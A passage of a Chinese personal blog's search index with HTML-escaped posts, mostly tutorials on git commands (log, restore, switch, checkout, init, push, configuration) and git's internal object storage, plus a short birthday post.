&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625067362274.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625067370478.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">31-git-26-reflog</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-log/"" data-c="
          &lt;h1 id=&#34;git-log&#34;&gt;git-log&lt;/h1&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git log&lt;/code&gt;命令按照提交时间从最晚到最早的顺序，列出所有 commit。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;格式&#34;&gt;格式&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;git log [&amp;lt;options&amp;gt;] [&amp;lt;since&amp;gt;..&amp;lt;until&amp;gt;] [[--] &amp;lt;path&amp;gt;...]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;默认列出当前分支的版本历史，&lt;strong&gt;按Q退出&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;--oneline&lt;/code&gt;参数让输出时，每个 commit 只占用一行。&lt;code&gt;--pretty=oneline --abbrev-commit&lt;/code&gt; 合用的简写。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log --oneline
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-n&lt;/code&gt;查看最近n次的提交信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 查看最近2次的提交历史记录
git log -2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;按补丁格式显示每个更新之间的差异。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log -p -2
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;搜索查找历史&#34;&gt;搜索查找历史&lt;/h3&gt;
&lt;p&gt;查找log，即搜索commit信息。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-i&lt;/code&gt;参数表示搜索时忽略大小写。&lt;/p&gt;
&lt;h4 id=&#34;通过作者搜索&#34;&gt;通过作者搜索&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log --author Andy
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;通过提交关键字搜索&#34;&gt;通过提交关键字搜索&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log -i --grep=[keywords]
// 该命令会列出所有包含Something字样的提交信息说明的提交记录
git log -i --grep=&amp;quot;Something&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;通过文件名搜索&#34;&gt;通过文件名搜索&lt;/h4&gt;
&lt;p&gt;列出某个文件的版本历史&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log [file]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;列出某个文件的版本历史，包括文件改名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log --follow [file]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;h3 id=&#34;美化输出&#34;&gt;美化输出&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;--graph&lt;/code&gt;：在日志旁以 ASCII 图形显示分支与合并历史。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--abbrev-commit&lt;/code&gt;：仅显示SHA-1的前7位，而非所有的40个字符。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--decorate&lt;/code&gt;参数用来显示一些相关的信息，如HEAD、分支名、tag名等&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--pretty&lt;/code&gt;：使用其他格式显示历史提交信息。可用的选项包括&lt;code&gt;oneline&lt;/code&gt;、&lt;code&gt;short&lt;/code&gt;、&lt;code&gt;full&lt;/code&gt;、&lt;code&gt;fuller&lt;/code&gt;和 &lt;code&gt;format&lt;/code&gt;（用来定义自己的格式）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log --graph --decorate --pretty=oneline --abbrev-commit
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;详解&#34;&gt;详解&lt;/h3&gt;
&lt;h4 id=&#34;-name-status&#34;&gt;--name-status&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;--name-status&lt;/code&gt;参数会带出每次提交对应的文件改动。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git log --name-status --oneline
---
c08099d add hello.txt to git rep
A       hello.txt
723687a add c.txt
A       c.txt
1a29bde 新增了a.txt和b.txt文件
A       a.txt
A       b.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;-follow&#34;&gt;--follow&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;不带&lt;/em&gt;follow参数的情况下，git把名为a.txt的文件全部提交记录找出来&lt;/li&gt;
&lt;li&gt;带follow参数的情况下，git会把当前以及重命名前的文件提交记录找出来&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二者的差异，就像是，一个『浮于表面』，只认历史上与当前文件名匹配的提交记录，一个认准文件的『真身』，不管当前文件曾经披着什么的『皮』，始终追溯它的真身。&lt;/p&gt;
&lt;h5 id=&#34;demo-follow&#34;&gt;demo-follow&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git init
echo ‘1st line —in a’ &amp;gt;&amp;gt; a.txt
git add a.txt &amp;amp;&amp;amp; git commit -m ‘add line for a.txt’
echo ‘2nd line —in a’ &amp;gt;&amp;gt; a.txt
git add a.txt &amp;amp;&amp;amp; git commit -m ‘add 1 line for a.txt’
echo ‘line 1 —in b’ &amp;gt;&amp;gt; b.txt
git add b.txt &amp;amp;&amp;amp; git commit -m ‘add line for b.txt’
echo ‘line 2 —in b’ &amp;gt;&amp;gt; b.txt
git add b.txt &amp;amp;&amp;amp; git commit -m ‘add line for b.txt’
git rm a.txt &amp;amp;&amp;amp; git commit -m ‘remove a.txt’
git mv b.txt a.txt &amp;amp;&amp;amp; git commit -m ‘rename b.txt to a.txt’

---文件状态变更
a.txt =&amp;gt; a.txt b.txt =&amp;gt; b.txt =&amp;gt; a.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;git log -p a.txt&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625285396990.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;git log -p --follow a.txt&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625285403872.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://x-front-team.github.io/2016/12/22/git-log-follow%E5%A5%87%E9%81%87%E8%AE%B0/&#34;&gt;https://x-front-team.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">30-git-25-log</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-restore/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;因为git checkout 命令职责较多、不够明确，所以git 2.23 版本新增了switch、restore命令&lt;/p&gt;
&lt;p&gt;switch命令专门用来切换分支、创建并切换分支等&lt;/p&gt;
&lt;p&gt;restore命令专门用来恢复(撤销)暂存区和工作区的文件&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;为了方便初步理解，先使用撤销&lt;/p&gt;
&lt;h3 id=&#34;撤销工作区文件的修改&#34;&gt;撤销工作区文件的修改&lt;/h3&gt;
&lt;p&gt;撤销工作区指定文件的修改 ，即从暂存区覆盖到工作区&lt;/p&gt;
&lt;p&gt;--worktree为默认参数，可以省略&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git restore [--worktree] [file]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;撤销工作区所有文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore .
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;撤销暂存区文件的修改&#34;&gt;撤销暂存区文件的修改&lt;/h3&gt;
&lt;p&gt;撤销暂存区指定文件的修改，即从仓库覆盖到暂存区。但是被撤销的文件不会更改，会恢复到工作区。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --staged [file]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;撤销暂存区所有文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --staged .
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;撤销工作区和暂存区文件的修改&#34;&gt;撤销工作区和暂存区文件的修改&lt;/h3&gt;
&lt;p&gt;撤销工作区和暂存区文件的修改，即从仓库到暂存区和工作区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --staged --worktree [file]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;切换工作区内容&#34;&gt;切换工作区内容&lt;/h3&gt;
&lt;p&gt;将工作区内容切换到某个快照&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --source [commitID] .
// 工作区切换到上次提交
git restore --source HEAD~ .
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数详解&#34;&gt;参数详解&lt;/h2&gt;
&lt;p&gt;进一步理解，使用恢复&lt;/p&gt;
&lt;p&gt;恢复一个文件，从哪里到哪里&lt;/p&gt;
&lt;p&gt;--source 来源地，即从哪里&lt;/p&gt;
&lt;p&gt;--staged 目的地，即到哪里(暂存区)&lt;/p&gt;
&lt;p&gt;--worktree 目的地，即到哪里(工作区)&lt;/p&gt;
&lt;p&gt;举例说明：假如把readme.md从上次提交同时恢复到暂存区和工作区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --source HEAD~ --staged --worktree readme.md
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624980286919.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注意事项&#34;&gt;注意事项&lt;/h2&gt;
&lt;p&gt;必须指定要覆盖的文件，可以是具体的某一个，也可以是全部文件，但必须要指定，否则会报以下错误&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;you must specify path(s) to restore
&lt;/code&gt;&lt;/pre&gt;
">29-git-24-restore</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-switch/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;因为git checkout 命令职责较多、不够明确，所以git 2.23 版本新增了switch、restore命令&lt;/p&gt;
&lt;p&gt;switch命令专门用来切换分支、创建并切换分支等&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;新建分支&#34;&gt;新建分支&lt;/h3&gt;
&lt;p&gt;新建并切换分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch -c [branch-name]
git switch -c new
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从某个快照新建并切换分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch -c [branch-name] [commitID]
git switch -c new c2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从某个标签新建并切换分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch -c [branch-name] [tag-name]
git switch -c new v2.0
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;切换分支&#34;&gt;切换分支&lt;/h3&gt;
&lt;p&gt;切换上次所在的分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch -
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;切换到&lt;code&gt;dev&lt;/code&gt;分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;与checkout的对比&#34;&gt;与checkout的对比&lt;/h2&gt;
&lt;h3 id=&#34;checkout&#34;&gt;checkout&lt;/h3&gt;
&lt;p&gt;checkout在分支方面的做用有两点：新建分支并切换到新建分支，切换分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b new
git checkout dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;switch&#34;&gt;switch&lt;/h3&gt;
&lt;p&gt;switch中相同作用的命令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch -c new
git switch dev
&lt;/code&gt;&lt;/pre&gt;
">28-git-23-switch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-checkout/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git checkout&lt;/code&gt;命令有多种用途。大致分为新建分支；切换分支、快照、标签；撤销文件。&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;新建分支&#34;&gt;新建分支&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;-b&lt;/code&gt;用于生成一个新的分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b new
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;切换分支&#34;&gt;切换分支&lt;/h3&gt;
&lt;p&gt;回到先前所在的分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;切换到&lt;code&gt;dev&lt;/code&gt;分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;切换到指定快照commit&#34;&gt;切换到指定快照（commit）&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout &amp;lt;commitID&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;切换到某个tag&#34;&gt;切换到某个tag&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout tags/1.1.4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当本地没有叫做1.1.4的分支时，可以省略&lt;code&gt;tags/&lt;/code&gt;,直接使用标签名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git checkout 1.1.4
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;撤销文件修改&#34;&gt;撤销文件修改&lt;/h3&gt;
&lt;h4 id=&#34;工作区&#34;&gt;工作区&lt;/h4&gt;
&lt;p&gt;将指定文件从暂存区复制到工作区，用来丢弃工作区对该文件的修改&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -- &amp;lt;filename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;暂存区和工作区&#34;&gt;暂存区和工作区&lt;/h4&gt;
&lt;p&gt;指定从某个 commit 恢复指定文件，同时改变暂存区和工作区&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout HEAD~ -- &amp;lt;filename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;参数表示进入交互模式，只恢复部分变化。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -p
&lt;/code&gt;&lt;/pre&gt;
">27-git-22-checkout</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/zhu-bao-bei-sheng-ri-kuai-le/"" data-c="
          &lt;p&gt;happy birthday~&lt;br&gt;
😛😛😛&lt;/p&gt;
&lt;p&gt;一岁一礼 一寸欢喜&lt;br&gt;
&lt;img src=&#34;https://leecss.com/post-images/1624805818323.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">26-life-1-祝宝贝生日快乐</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-yuan-li/"" data-c="
          &lt;h2 id=&#34;git是如何存储信息的&#34;&gt;git是如何存储信息的&lt;/h2&gt;
&lt;p&gt;1、初始化仓库，新建文件，并添加到暂存区&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git init
echo &#39;111&#39; &amp;gt; a.txt
echo &#39;222&#39; &amp;gt; b.txt
git add *.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 查看一下当前的git仓库中的内容
tree .git

├─hooks    
├─info     
├─objects  
│  ├─4e    
│  ├─71    
│  ├─info  
│  └─pack  
└─refs     
    ├─heads
    └─tags 
    
ls -a .git/objects/4e
./  ../  f5d11d3b99f88fb9f70b694de01db16c56ed50

ls -a .git/objects/71
./  ../  70f7d93c37a8861f0e6816780b2881ad5f58d2

// 查看一下f5d11d3b99f88fb9f70b694de01db16c56ed50文件中的内容
cat .git/objects/4e/f5d11d3b99f88fb9f70b694de01db16c56ed50
x☺K□□OR0gP744TW□☻∟.♥☻
// 打印出来的是一些乱码，原因是因为git对储存的内容做了二进制压缩
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2、cat-file&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cat-file [-t] [-p]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;-t 打印文件类型&lt;/p&gt;
&lt;p&gt;-p 打印文件具体内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cat-file -t 4ef5d1
blob
git cat-file -p 4ef5d1
&#39;111&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3、git object&lt;/p&gt;
&lt;p&gt;git 储存信息的最小单元，对象数据库包含四类对象。git对象创建完成后均不可变更。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Blob：包含二进制数据，它们是文件内容。只要文件内容改变，就会在对象数据库中生成一个blob对象。注意，blob对象只保存文件内容，不含文件名和文件存储位置等信息。如果文件名改变，或者文件储存位置改变，不会生成新的blob对象。&lt;/li&gt;
&lt;li&gt;Tree：blob对象的集合，以及它们的文件名和权限。一个tree对象描述一个时点上的一个目录。&lt;/li&gt;
&lt;li&gt;Commit：描述一个时点上的项目状态，包含一条log信息，一个tree对象和指向父节点（parent commits）的指针。第一个commit对象没有父节点。
&lt;ul&gt;
&lt;li&gt;记录 root tree SHA1&lt;/li&gt;
&lt;li&gt;记录 parent commit SHA1&lt;/li&gt;
&lt;li&gt;记录作者、时间和 commit message&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4、sha1哈希算法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;111 -&amp;gt; 4ef5d11d3b99f88fb9f70b694de01db16c56ed50
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每个git对象都有一个哈希值，哈希值可以理解为我们的身份证号&lt;/p&gt;
&lt;p&gt;&lt;code&gt;4ef5d11d3b99f88fb9f70b694de01db16c56ed50&lt;/code&gt;就是内容为111类型为blob的git对象的身份证号，我们可以通过4ef5d11d3b99f88fb9f70b694de01db16c56ed50找到这个git对象&lt;/p&gt;
&lt;p&gt;5、git commit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git commit -m &#39;init&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;tree .git

├─hooks
├─info
├─logs
│  └─refs
│      └─heads
├─objects
│  ├─39
│  ├─4e
│  ├─5f
│  ├─71
│  ├─info
│  └─pack
└─refs
    ├─heads
    └─tags
    
 ls -a .git/objects/39
./  ../  bd985025d281e7c1d1c9493c90156fb9e26ea0

ls -a .git/objects/5f
./  ../  3f16e16db5faec1bf71fab36cbad24fbddfd39
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cat-file -t 5f3f16
tree

git cat-file -p 5f3f16
100644 blob 4ef5d11d3b99f88fb9f70b694de01db16c56ed50    a.txt
100644 blob 7170f7d93c37a8861f0e6816780b2881ad5f58d2    b.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624773693534.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cat-file -t 39bd98
commit

git cat-file -p 39bd98
tree 5f3f16e16db5faec1bf71fab36cbad24fbddfd39
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624773720929.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;6、HEAD指针和分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cat .git/HEAD
ref: refs/heads/master

cat .git/refs/heads/master
39bd985025d281e7c1d1c9493c90156fb9e26ea0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出，HEAD指针指向分支指针，分支指针指向最新的commit&lt;/p&gt;
&lt;p&gt;HEAD、分支、普通的Tag可以简单的理解成是一个指针，指向对应commit的SHA1值。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624773733859.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;7、为什么要把文件的权限和文件名储存在Tree object里面而不是Blob object呢？&lt;/p&gt;
&lt;p&gt;因为更改一个文件名就需要新建一个Blob object，假如文件很大的话，会很占空间，而Tree object体积相对很小&lt;/p&gt;
&lt;p&gt;8、当你修改了其中一个文件，创建一个新的commit后&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624774577309.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;git的三个分区&#34;&gt;git的三个分区&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;工作目录 （ working directory ）：操作系统上的文件，所有代码开发编辑都在这上面完成。&lt;/li&gt;
&lt;li&gt;索引（ index or staging area ）：可以理解为一个暂存区域，这里面的代码会在下一次commit被提交到Git仓库。&lt;/li&gt;
&lt;li&gt;Git仓库（ git repository ）：由Git object记录着每一次提交的快照，以及链式结构记录的提交变更历史。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624774695680.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;李泽帆&lt;/p&gt;
&lt;p&gt;https://www.lzane.com/tech/git-internal/&lt;/p&gt;
&lt;/blockquote&gt;
">25-git-21-原理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-init/"" data-c="
          &lt;h2 id=&#34;将当前目录转为git仓库&#34;&gt;将当前目录转为git仓库&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git init&lt;/code&gt;命令将当前目录转为git仓库。&lt;/p&gt;
&lt;p&gt;它会在当前目录下生成一个.git子目录，在其中写入git的配置和项目的快照。&lt;/p&gt;
&lt;h2 id=&#34;在当前目录下创建一个新的目录&#34;&gt;在当前目录下创建一个新的目录&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git init &amp;lt;repository-name&amp;gt;
git init place
&lt;/code&gt;&lt;/pre&gt;
">24-git-20-init</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-an-zhuang/"" data-c="
          &lt;h2 id=&#34;windows&#34;&gt;windows&lt;/h2&gt;
&lt;p&gt;从官方网站上下载安装包，按照默认配置快速安装（一直下一步），访问git官网，即可下载git，git的官方网址如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://git-scm.com/downloads&#34;&gt;https://git-scm.com/downloads&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在windows中安装git的过程中，如果你没有修改默认的设置，当安装完成后，安装程序会自动为你安装两种客户端，一种是图形化的客户端，一种是命令行的客户端，图形化的客户端被称之为”Git GUI”，命令行的客户端被称之为”Git Bash”，在系统的”开始”菜单中可以找到”Git GUI”和”Git Bash”，同时，默认情况下，当你安装完成git后，你的右键菜单中会多出两个选项，”Git GUI Here”和”Git Bash Here”，通过这两项，你可以在任何目录中打开”Git GUI”和”Git Bash”，”Git GUI”和”Git Bash”都是客户端程序，我们可以通过这两种程序中的任意一种来操作git，从而达到版本控制的目的，这两种工具在不同的使用场景下各有优势，命令行的优势在于比较通用，而且当你需要编写一些版本控制的自动化脚本时，无可避免的需要使用git命令，使用图形化的好处就是比较直观，所以，我们有可能会交替的使用这两种工具，但是主要以命令行的使用模式为主，因为只要理解了相关概念和git命令后，再去使用任何一种图形化工具，都是非常简单的。&lt;/p&gt;
&lt;p&gt;除了gitk（默认安装的图形化客户端就包含了gitk），比较出名的git图形化工具还有SourceTree、TortoiseGit、GitHubDesktop、GitKraken、GitUp等，当你熟悉了git命令以后，再去操作这些图形化工具都会变得游刃有余。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开gitk图形化操作界面&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gitk
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;初始化配置&#34;&gt;初始化配置&lt;/h2&gt;
&lt;p&gt;如果想要使用git进行版本管理，我们首先要做的就是，设置自己的”用户名”和”用户邮箱”，这些信息是必须的，特别是在多人协作时，这些信息也是非常必要的，所以，在完成安装操作以后，我们首先要做的就是设置自己的”用户名”和”用户邮箱”，这些信息只需要设置一次，就可以一直正常的使用git，除非你有需要修改这些信息。&lt;/p&gt;
&lt;h3 id=&#34;设置用户名和邮箱&#34;&gt;设置用户名和邮箱&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git config --global user.name &amp;quot;lee&amp;quot;
git config --global user.email &amp;quot;lee@emial.com&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查看自己的用户名和邮箱设置&#34;&gt;查看自己的用户名和邮箱设置&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git config --global --list
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;参数&#34;&gt;参数&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git config --system：使对应配置针对系统内所有的用户有效
git config --global：使对应配置针对当前系统用户的所有仓库生效
git config --local：使对应配置只针对当前仓库有效
local选项设置的优先级最高。
&lt;/code&gt;&lt;/pre&gt;
">23-git-19-安装</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-push/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git push&lt;/code&gt;命令用于将本地分支的更新，推送到远程主机。它的格式与&lt;code&gt;git pull&lt;/code&gt;命令相仿。&lt;/p&gt;
&lt;p&gt;git push和当前的HEAD指针位于哪里没关系，只要指定完整的格式，即使当前指针不在分支上，也可以推送到远程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git checkout c0
git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当要推送到的目的分支不存在时，Git 会在远程仓库中根据你提供的名称帮你创建这个分支！&lt;/p&gt;
